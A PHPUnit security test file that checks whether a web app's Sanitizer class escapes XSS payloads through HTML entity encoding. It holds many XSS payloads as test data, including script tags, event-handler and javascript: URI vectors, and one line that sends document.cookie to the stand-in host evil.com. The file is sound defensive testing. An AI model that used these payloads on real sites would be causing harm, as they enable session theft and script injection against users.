<?php

declare(strict_types=1);

namespace WebklientApp\Tests\Security;

use PHPUnit\Framework\TestCase;
use WebklientApp\Core\Validation\Sanitizer;

/**
 * Security tests: XSS attack vector protection via HTML entity encoding.
 *
 * Sanitizer::string() uses htmlspecialchars(ENT_QUOTES|ENT_SUBSTITUTE) which
 * converts < > " ' & to HTML entities, neutralizing XSS payloads.
 */
class XssProtectionTest extends TestCase
{
    #[\PHPUnit\Framework\Attributes\DataProvider('xssPayloadProvider')]
    public function testSanitizerNeutializesXssPayloads(string $payload): void
    {
        $sanitized = Sanitizer::string($payload);

        $this->assertStringNotContainsString('<', $sanitized, "Unescaped < found in: {$sanitized}");
        $this->assertStringNotContainsString('>', $sanitized, "Unescaped > found in: {$sanitized}");
    }

    public static function xssPayloadProvider(): array
    {
        return [
            'basic script tag' => ['<script>alert("XSS")</script>'],
            'img onerror' => ['<img src=x onerror=alert(1)>'],
            'svg onload' => ['<svg/onload=alert(1)>'],
            'event handler' => ['<div onclick="alert(1)">click me</div>'],
            'javascript protocol' => ['<a href="javascript:alert(1)">link</a>'],
            'encoded script' => ['<script>alert(String.fromCharCode(88,83,83))</script>'],
            'nested tags' => ['<scr<script>ipt>alert(1)</scr</script>ipt>'],
            'uppercase tags' => ['<SCRIPT>alert(1)</SCRIPT>'],
            'mixed case' => ['<ScRiPt>alert(1)</sCrIpT>'],
            'body onload' => ['<body onload="alert(1)">'],
            'iframe injection' => ['<iframe src="javascript:alert(1)">'],
            'input autofocus' => ['<input autofocus onfocus=alert(1)>'],
            'style expression' => ['<div style="background:url(javascript:alert(1))">'],
            'data uri' => ['<object data="data:text/html,<script>alert(1)</script>">'],
            'single quotes' => ["<img src='x' onerror='alert(1)'>"],
            'no quotes' => ['<img src=x onerror=alert(1)>'],
            'tab in tag' => ["<img\tsrc=x\tonerror=alert(1)>"],
            'null byte' => ["<scr\x00ipt>alert(1)</script>"],
        ];
    }

    public function testScriptTagConvertedToEntities(): void
    {
        $result = Sanitizer::string('<script>alert(1)</script>');
        $this->assertStringContainsString('&lt;script&gt;', $result);
        $this->assertStringContainsString('&lt;/script&gt;', $result);
    }

    public function testDoubleQuotesEncoded(): void
    {
        $result = Sanitizer::string('"><script>alert(1)</script>');
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringNotContainsString('<', $result);
    }

    public function testSingleQuotesEncoded(): void
    {
        $result = Sanitizer::string("'><script>alert(1)</script>");
        $this->assertStringContainsString('&#039;', $result);
        $this->assertStringNotContainsString('<', $result);
    }

    public function testAmpersandEncoded(): void
    {
        $result = Sanitizer::string('&lt;script&gt;');
        $this->assertStringContainsString('&amp;', $result);
    }

    public function testArraySanitizationNeutralizesNestedXss(): void
    {
        $input = [
            'name' => '<script>document.cookie</script>',
            'profile' => [
                'bio' => '<img src=x onerror=fetch("//evil.com/"+document.cookie)>',
                'website' => '<a href="javascript:void(0)" onclick="alert(1)">site</a>',
            ],
            'settings' => [
                'theme' => [
                    'custom_css' => '<style>body{background:url("javascript:alert(1)")}</style>',
                ],
            ],
        ];

        $sanitized = Sanitizer::array($input);

        $this->assertStringNotContainsString('<', $sanitized['name']);
        $this->assertStringNotContainsString('<', $sanitized['profile']['bio']);
        $this->assertStringNotContainsString('<', $sanitized['profile']['website']);
        $this->assertStringNotContainsString('<', $sanitized['settings']['theme']['custom_css']);
    }

    public function testArrayPreservesNonStringValues(): void
    {
        $input = [
            'count' => 42,
            'active' => true,
            'score' => 3.14,
            'nothing' => null,
        ];
        $result = Sanitizer::array($input);

        $this->assertSame(42, $result['count']);
        $this->assertTrue($result['active']);
        $this->assertSame(3.14, $result['score']);
        $this->assertNull($result['nothing']);
    }

    public function testHtmlEntitiesProperlyEncoded(): void
    {
        $input = '"><script>alert(1)</script>';
        $sanitized = Sanitizer::string($input);

        $this->assertStringContainsString('&lt;', $sanitized);
        $this->assertStringContainsString('&gt;', $sanitized);
        $this->assertStringContainsString('&quot;', $sanitized);
    }

    public function testSvgXssNeutralized(): void
    {
        $payloads = [
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributename=x to=y>',
            '<svg/onload=alert(1)>',
        ];

        foreach ($payloads as $payload) {
            $sanitized = Sanitizer::string($payload);
            $this->assertStringNotContainsString('<', $sanitized);
        }
    }

    public function testFilenameXssBlocked(): void
    {
        $filename = '<img src=x onerror=alert(1)>.jpg';
        $sanitized = Sanitizer::filename($filename);
        $this->assertStringNotContainsString('<', $sanitized);
        $this->assertStringNotContainsString('>', $sanitized);
        $this->assertStringNotContainsString('=', $sanitized);
        $this->assertStringNotContainsString(' ', $sanitized);
    }

    public function testDoubleEncodingPrevention(): void
    {
        $input = '&lt;script&gt;alert(1)&lt;/script&gt;';
        $sanitized = Sanitizer::string($input);
        $this->assertStringNotContainsString('<script>', $sanitized);
    }

    public function testSanitizedOutputSafeForHtmlAttribute(): void
    {
        $input = '" onclick="alert(1)" data-x="';
        $sanitized = Sanitizer::string($input);
        $this->assertStringNotContainsString('"', $sanitized);
    }

    public function testSanitizedOutputSafeForHtmlContent(): void
    {
        $input = '<b>bold</b> & <i>italic</i>';
        $sanitized = Sanitizer::string($input);
        $this->assertStringNotContainsString('<', $sanitized);
        $this->assertStringNotContainsString('>', $sanitized);
        $this->assertStringContainsString('&amp;', $sanitized);
    }

    public function testNullBytesHandled(): void
    {
        $input = "safe\x00<script>evil</script>";
        $sanitized = Sanitizer::string($input);
        $this->assertStringNotContainsString('<', $sanitized);
    }

    public function testMultibyteStringPreserved(): void
    {
        $input = 'Příliš žluťoučký kůň';
        $sanitized = Sanitizer::string($input);
        $this->assertSame($input, $sanitized);
    }

    public function testEmptyStringPreserved(): void
    {
        $this->assertSame('', Sanitizer::string(''));
    }

    public function testPlainTextUnchanged(): void
    {
        $input = 'Hello World 123';
        $this->assertSame($input, Sanitizer::string($input));
    }
}
